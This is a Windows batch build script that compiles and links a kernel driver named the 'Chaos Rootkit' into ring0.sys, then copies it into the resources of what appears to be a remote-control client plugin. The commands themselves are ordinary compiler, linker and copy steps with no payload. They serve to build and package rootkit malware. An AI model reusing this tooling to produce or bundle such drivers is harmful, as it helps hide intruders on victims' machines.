@echo off
REM ============================================================
REM Chaos Rootkit Driver Build Script
REM This script builds the kernel driver without the WDK nightmare
REM ============================================================

setlocal enabledelayedexpansion

echo ============================================================
echo  Chaos Rootkit Driver Builder
echo ============================================================

REM Set paths
set "DRIVER_DIR=%~dp0Chaos-Rootkit-Driver"
set "OUTPUT_DIR=%DRIVER_DIR%\x64\Release"
set "OBJ_DIR=%DRIVER_DIR%\Chaos-Rootkit\x64\Release"
set "CLIENT_RES=%~dp0Pulsar.Plugin.Ring0.Client\Resources"

REM Find Visual Studio
set "VSDEV="
if exist "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat" (
    set "VSDEV=C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\VsDevCmd.bat" (
    set "VSDEV=C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\VsDevCmd.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\Tools\VsDevCmd.bat" (
    set "VSDEV=C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\Tools\VsDevCmd.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\Common7\Tools\VsDevCmd.bat" (
    set "VSDEV=C:\Program Files\Microsoft Visual Studio\2022\Enterprise\Common7\Tools\VsDevCmd.bat"
)

if "%VSDEV%"=="" (
    echo ERROR: Visual Studio 2022 not found!
    exit /b 1
)

echo [1/4] Setting up build environment...
call "%VSDEV%" -arch=amd64 >nul 2>&1

REM Find WDK
set "WDK_ROOT=C:\Program Files (x86)\Windows Kits\10"
if not exist "%WDK_ROOT%\Include" (
    echo ERROR: Windows Driver Kit not found!
    exit /b 1
)

REM Find latest WDK version
for /f "delims=" %%i in ('dir /b /ad "%WDK_ROOT%\Include" 2^>nul ^| findstr /r "^10\.0\."') do set "WDK_VER=%%i"
echo    Using WDK version: %WDK_VER%

REM Create output directories
if not exist "%OUTPUT_DIR%" mkdir "%OUTPUT_DIR%"
if not exist "%OBJ_DIR%" mkdir "%OBJ_DIR%"

echo [2/4] Compiling driver sources...
cd /d "%DRIVER_DIR%"

REM Compile Driver.c
cl.exe /c /Zi /nologo /W1 /WX- /O2 /Gm- /GS /fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline ^
    /I"%WDK_ROOT%\Include\%WDK_VER%\km" ^
    /I"%WDK_ROOT%\Include\%WDK_VER%\km\crt" ^
    /I"%WDK_ROOT%\Include\%WDK_VER%\shared" ^
    /I"%WDK_ROOT%\Include\wdf\kmdf\1.33" ^
    /D_AMD64_ /DAMD64 /DNTDDI_VERSION=0x0A00000B /D_WIN32_WINNT=0x0A00 /DWINVER=0x0A00 /DWINNT=1 /DPOOL_NX_OPTIN=1 ^
    /Fo"%OBJ_DIR%\Driver.obj" ^
    /Fd"%OBJ_DIR%\vc143.pdb" ^
    /TC Driver.c
if errorlevel 1 (
    echo ERROR: Failed to compile Driver.c
    exit /b 1
)

REM Compile utils.c
cl.exe /c /Zi /nologo /W1 /WX- /O2 /Gm- /GS /fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline ^
    /I"%WDK_ROOT%\Include\%WDK_VER%\km" ^
    /I"%WDK_ROOT%\Include\%WDK_VER%\km\crt" ^
    /I"%WDK_ROOT%\Include\%WDK_VER%\shared" ^
    /I"%WDK_ROOT%\Include\wdf\kmdf\1.33" ^
    /D_AMD64_ /DAMD64 /DNTDDI_VERSION=0x0A00000B /D_WIN32_WINNT=0x0A00 /DWINVER=0x0A00 /DWINNT=1 /DPOOL_NX_OPTIN=1 ^
    /Fo"%OBJ_DIR%\utils.obj" ^
    /Fd"%OBJ_DIR%\vc143.pdb" ^
    /TC utils.c
if errorlevel 1 (
    echo ERROR: Failed to compile utils.c
    exit /b 1
)

echo [3/4] Linking driver...
link.exe /NOLOGO /DRIVER /ENTRY:DriverEntry /SUBSYSTEM:NATIVE /NODEFAULTLIB ^
    /OUT:"%OUTPUT_DIR%\ring0.sys" ^
    /LIBPATH:"%WDK_ROOT%\lib\%WDK_VER%\km\x64" ^
    /LIBPATH:"%WDK_ROOT%\lib\wdf\kmdf\x64\1.33" ^
    ntoskrnl.lib wdfldr.lib wdfdriverentry.lib bufferoverflowfastfailk.lib fltmgr.lib fwpkclnt.lib netio.lib ndis.lib ^
    ZwSwapCert.lib ^
    "%OBJ_DIR%\Driver.obj" "%OBJ_DIR%\utils.obj"
if errorlevel 1 (
    echo ERROR: Failed to link driver
    exit /b 1
)

echo [4/4] Copying to resources and plugins...
set "PLUGINS_DIR=%~dp0plugins"
copy /Y "%OUTPUT_DIR%\ring0.sys" "%CLIENT_RES%\ring0.sys" >nul
copy /Y "%OUTPUT_DIR%\ring0.sys" "%PLUGINS_DIR%\ring0.sys" >nul

echo.
echo ============================================================
echo  BUILD SUCCESSFUL!
echo ============================================================
echo  Output: %OUTPUT_DIR%\ring0.sys
echo  Copied: %CLIENT_RES%\ring0.sys
echo  Copied: %PLUGINS_DIR%\ring0.sys
echo ============================================================

endlocal
